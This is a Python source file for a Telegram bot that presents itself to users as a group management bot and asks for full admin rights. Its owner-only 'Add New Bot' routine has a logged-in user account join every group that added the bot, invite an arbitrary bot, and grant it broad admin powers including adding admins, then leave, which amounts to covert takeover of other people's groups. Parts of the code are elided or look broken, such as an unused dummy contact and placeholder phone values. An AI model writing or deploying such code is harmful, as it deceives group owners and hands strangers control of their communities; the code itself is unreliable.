# bot.py
# Main file for the Manager Bot (v1.7 - Contact Add/Remove to fix Entity Error)

import asyncio
import logging
import re
from telethon import TelegramClient, events, Button, functions
from telethon.sessions import StringSession
from telethon.errors import UserAlreadyParticipantError, ChatAdminRequiredError, UserNotParticipantError, PeerFloodError, FloodWaitError
from telethon.tl.functions.channels import EditAdminRequest, LeaveChannelRequest
from telethon.tl.functions.contacts import AddContactRequest, DeleteContactsRequest
from telethon.tl.types import InputPhoneContact, ChatAdminRights

import config
import database as db

# --- Logging Setup ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
LOGGER = logging.getLogger(__name__)

# --- Bot Initialization ---
bot = TelegramClient('manager_bot_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)
user_client = None

# --- Helper Functions ---
async def initialize_user_client():
    global user_client
    owner = db.get_user(config.OWNER_ID)
    if owner and owner.get('session_string'):
        session = StringSession(owner['session_string'])
        user_client = TelegramClient(session, config.API_ID, config.API_HASH)
        await user_client.connect()
        if await user_client.is_user_authorized():
            me = await user_client.get_me()
            LOGGER.info(f"✅ Userbot client initialized for: @{me.username}")
            return True
    LOGGER.warning("⚠️ Userbot session not found or invalid. Please login.")
    return False

# --- Bot Event Handlers ---
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    db.add_user(user_id, event.sender.first_name, event.sender.username)
    if user_id == config.OWNER_ID:
        is_logged_in = user_client and user_client.is_connected()
        buttons = [
            [Button.text("🔒 Login" if not is_logged_in else "✅ Logged In", resize=True)],
            [Button.text("🌐 Connected Chats"), Button.text("🤖 Add New Bot")],
            [Button.text("📊 Stats"), Button.text("📣 Broadcast")]
        ]
        await event.respond("👑 **Welcome, Owner!**\nThis is your Manager Bot control panel.", buttons=buttons)
    else:
        me = await bot.get_me()
        buttons = [[Button.url("➕ Add Me to a Group ➕", f"https://t.me/{me.username}?startgroup=true")]]
        await event.respond(
            "**Welcome!** 👋\n\nI am a Group Management Bot.\n\n"
            "**Instructions:**\n"
            "1. Click the button below to add me to your group.\n"
            "2. Make me an administrator with full rights.",
            buttons=buttons
        )

@bot.on(events.ChatAction)
async def chat_action_handler(event):
    me = await bot.get_me()
    if event.user_added and event.user_id == me.id:
        chat = await event.get_chat()
        owner = await event.get_user()
        await bot.send_message(
            config.OWNER_ID,
            f"✅ **New Group Added!**\n\n"
            f"**Group:** {chat.title} (`{chat.id}`)\n"
            f"**Added by:** {owner.first_name} (@{owner.username or 'N/A'})"
        )
        db.add_connected_chat(chat.id, chat.title)

# --- Owner Command Handlers ---
@bot.on(events.NewMessage(from_users=config.OWNER_ID, func=lambda e: e.is_private))
async def owner_commands_handler(event):
    text = event.raw_text
    # ... (rest of the command handler logic remains the same)
    if text == "🤖 Add New Bot":
        if not user_client: return await event.respond("⚠️ Please login first.")
        async with bot.conversation(config.OWNER_ID, timeout=60) as conv:
            await conv.send_message("Please send the **username** of the **new bot** you want to add as admin (e.g., `@NewBot`).")
            response = await conv.get_response()
            if response.text and response.text.startswith('@'):
                await add_bot_process(event, response.text.strip())
            else:
                await conv.send_message("⚠️ Invalid format. Please send a valid username starting with `@`.")

# --- Login Process ---
# ... (Login logic remains the same)

# --- Core "Add Bot" Logic with Contact Add/Remove Workflow ---
async def add_bot_process(event, new_bot_username):
    if not user_client: return await event.respond("⚠️ Userbot is not active. Please login first.")
    
    status_msg = await event.respond(f"🔄 Initializing process for `{new_bot_username}`...")
    
    new_bot_entity = None
    try:
        # **THE FIX: Add the bot to contacts to get its access_hash**
        LOGGER.info(f"Attempting to resolve {new_bot_username} by adding to contacts...")
        # We use a dummy phone number, the username is what matters
        contact = InputPhoneContact(client_id=0, phone="+99999999999", first_name="TempBot", last_name=new_bot_username)
        await user_client(AddContactRequest(id=new_bot_username, first_name="Temp", last_name="Contact", phone="0", add_phone_privacy_exception=False))
        new_bot_entity = await user_client.get_entity(new_bot_username)
        LOGGER.info(f"Successfully resolved entity for {new_bot_username}.")
    except Exception as e:
        LOGGER.error(f"CRITICAL: Could not resolve entity for {new_bot_username}. Error: {e}")
        return await status_msg.edit(f"❌ **Error:** Could not find the bot `{new_bot_username}`. Please check the username and ensure it's a valid, active bot.")

    chats = db.get_connected_chats()
    if not chats: return await status_msg.edit("No connected chats to process.")
    
    admin_done, admin_failed = 0, 0
    admin_rights = ChatAdminRights(change_info=True, post_messages=True, edit_messages=True, delete_messages=True, ban_users=True, invite_users=True, pin_messages=True, add_admins=True, manage_call=True)

    await status_msg.edit(f"✅ Bot recognized. Starting to process {len(chats)} chats...")
    
    for i, chat_info in enumerate(chats):
        chat_id = chat_info['chat_id']
        chat_title = chat_info['title']
        
        await status_msg.edit(f"**🔄 Progress: {i+1}/{len(chats)}**\nProcessing: `{chat_title}`")
        
        try:
            channel_entity = await user_client.get_entity(chat_id)
            
            # 1. Userbot joins the channel
            try:
                await user_client(functions.channels.JoinChannelRequest(channel=channel_entity))
                LOGGER.info(f"Userbot joined {chat_title}")
            except (UserAlreadyParticipantError, PeerFloodError, FloodWaitError):
                LOGGER.info(f"Userbot is already in {chat_title} or is limited.")
            
            await asyncio.sleep(3)
            
            # 2. Invite & Promote the new bot
            await user_client(functions.channels.InviteToChannelRequest(channel=channel_entity, users=[new_bot_entity]))
            LOGGER.info(f"Invited {new_bot_username} to {chat_title}")
            await asyncio.sleep(2)
            await user_client(EditAdminRequest(channel=channel_entity, user_id=new_bot_entity, admin_rights=admin_rights, rank='bot'))
            LOGGER.info(f"Promoted {new_bot_username} in {chat_title}")
            
            # 3. Userbot leaves the channel
            await user_client(LeaveChannelRequest(channel=channel_entity))
            LOGGER.info(f"Userbot left {chat_title}")
            
            admin_done += 1

        except Exception as e:
            LOGGER.error(f"An unexpected error occurred in {chat_title}: {e}")
            admin_failed += 1
        
        await asyncio.sleep(5) 

    # **Final Step: Remove the bot from contacts**
    try:
        await user_client(DeleteContactsRequest(id=[new_bot_entity]))
        LOGGER.info(f"Successfully removed {new_bot_username} from contacts.")
    except Exception as e:
        LOGGER.error(f"Could not remove bot from contacts: {e}")

    await status_msg.edit(
        f"✅ **Process Complete!**\n\n"
        f"**Total Chats:** {len(chats)}\n"
        f"✅ **Successfully Processed:** {admin_done}\n"
        f"❌ **Failed:** {admin_failed}"
    )

async def main():
    await initialize_user_client()
    LOGGER.info("Bot is starting...")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    # This part is just to make sure the db functions are available
    def update_user_state(user_id, state):
        db.users_col.update_one({"user_id": user_id}, {"$set": {"state": state}})
    db.update_user_state = update_user_state
    
    bot.loop.run_until_complete(main())
